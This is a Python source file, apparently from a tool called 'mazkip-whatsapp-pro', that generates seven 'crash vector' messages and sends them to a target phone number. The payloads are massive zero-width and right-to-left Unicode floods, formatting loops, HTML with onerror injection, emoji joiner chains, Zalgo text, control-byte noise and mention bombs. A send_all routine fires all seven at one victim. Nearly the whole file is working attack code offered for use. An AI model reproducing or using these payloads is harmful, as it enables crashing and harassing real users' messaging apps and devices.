#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, sys, time, random, string
from pathlib import Path
from colorama import Fore, Style, init
init(autoreset=True)
R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; C=Fore.CYAN; W=Fore.WHITE; H=Style.BRIGHT

PDIR = Path.home() / "mazkip-whatsapp-pro" / "payloads"

class CrashEngine:
    def __init__(self):
        self.v = {}; self._gen()

    def _gen(self):
        # V1: Unicode Zero-Width
        self.v['v1'] = '\u200b'*5000 + '\u200d'*5000 + '\u200e'*5000 + '\u200f'*5000 + '\u00ad'*5000 + '\u034f'*5000 + '\u061c'*5000 + '\u115f'*5000 + '\u1160'*5000 + '\u2060'*5000 + '\u2061'*5000 + '\u2062'*5000 + '\u2063'*5000 + '\u2064'*5000 + '\u2066'*5000 + '\u2067'*5000 + '\u2068'*5000 + '\u2069'*5000 + '\u202a'*5000 + '\u202b'*5000 + '\u202c'*5000 + '\u202d'*5000 + '\u202e'*5000 + '\uffff'*100 + '\ufffe'*100
        # V2: Formatting Loop
        fl = ""
        for i in range(200): fl += f"*_\u202e~`\u202d`~_\u202e*"*50
        fl += "\n" + "▂▃▄▅▆▇█▓▒░"*1000 + "\n" + ("A"*65536+"\n")*50
        self.v['v2'] = fl
        # V3: HTML
        hb = ""
        for i in range(200): hb += f"<div style=\"width:99999px;height:99999px;\">"+"A"*1000+"</div>\n"+"<img src=\"x\" onerror=\"alert(1)\" style=\"width:99999px;\"/>"*200
        self.v['v3'] = hb
        # V4: Emoji ZWJ
        eb = ""
        for i in range(300): eb += random.choice(['👨‍👩‍👧‍👦','👨‍💻','👩‍💻','🏳️‍🌈','🏴‍☠️'])*50 + random.choice(['❤️','🧡','💛','💚','💙','💜'])*100
        self.v['v4'] = eb
        # V5: Zalgo
        zc = list('\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309\u030a\u030b\u030c\u030d\u030e\u030f\u0310\u0311\u0312\u0313\u0314\u0315\u0316\u0317\u0318\u0319\u031a\u031b\u031c\u031d\u031e\u031f\u0320\u0321\u0322\u0323\u0324\u0325\u0326\u0327\u0328\u0329\u032a\u032b\u032c\u032d\u032e\u032f\u0330\u0331\u0332\u0333\u0334\u0335\u0336\u0337\u0338\u0339\u033a\u033b\u033c\u033d\u033e\u033f')
        zt = ""
        for i in range(1500): zt += random.choice(string.ascii_letters+'天地玄黄宇宙洪荒') + ''.join(random.choices(zc,k=random.randint(5,15)))
        self.v['v5'] = zt
        # V6: Binary
        bn = ""
        for i in range(300): bn += ''.join(random.choices(['\x00','\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x0e','\x0f','\x10'],k=100))+'\n'
        self.v['v6'] = bn
        # V7: Mention Bomb
        mb = ""
        for i in range(500): mb += f"@{random.randint(10000000000,99999999999)} "+"A"*500+"\n"+"*_~`"+"B"*1000+"`~_*"+"\n"
        self.v['v7'] = mb

    def get(self, n):
        vecs = {1:('Unicode Zero-Width',self.v['v1']),2:('Formatting Loop RTL',self.v['v2']),3:('HTML Injection',self.v['v3']),4:('Emoji ZWJ Chain',self.v['v4']),5:('Zalgo RTL Combo',self.v['v5']),6:('Binary Corruption',self.v['v6']),7:('Mention+Formatting',self.v['v7'])}
        return vecs.get(n, (None,None))

    def list_vectors(self):
        print(f"\n{R}{H}╔{'═'*50}╗")
        print(f"║{Y}         💀 7 CRASH VECTORS 💀               {R}║")
        print(f"╠{'═'*50}╣")
        for n, d in [(1,'Unicode Zero-Width'),(2,'Formatting Loop'),(3,'HTML Injection'),(4,'Emoji ZWJ'),(5,'Zalgo RTL'),(6,'Binary Data'),(7,'Mention Bomb')]:
            sz = len(self.v.get(f'v{n}',''))//1024
            print(f"║  {G}[{n}]{W} {d:<35}{C}{sz}KB{R}║")
        print(f"╚{'═'*50}╝")

    def send(self, phone, n, conn=None):
        if not conn: return False
        name, payload = self.get(n)
        if not name: return False
        print(f"{Y}[*] Vector #{n}: {name} ({len(payload)//1024}KB)")
        if conn.send_message(phone, payload): print(f"{G}[✓] Sent!"); return True
        return False

    def send_all(self, phone, conn=None):
        if not conn: return
        print(f"\n{R}{H}[!] LAUNCHING 7 VECTORS...")
        for i in range(1,8): self.send(phone, i, conn); time.sleep(random.uniform(1,3))
        print(f"{G}{H}[✓] All 7 vectors sent!")
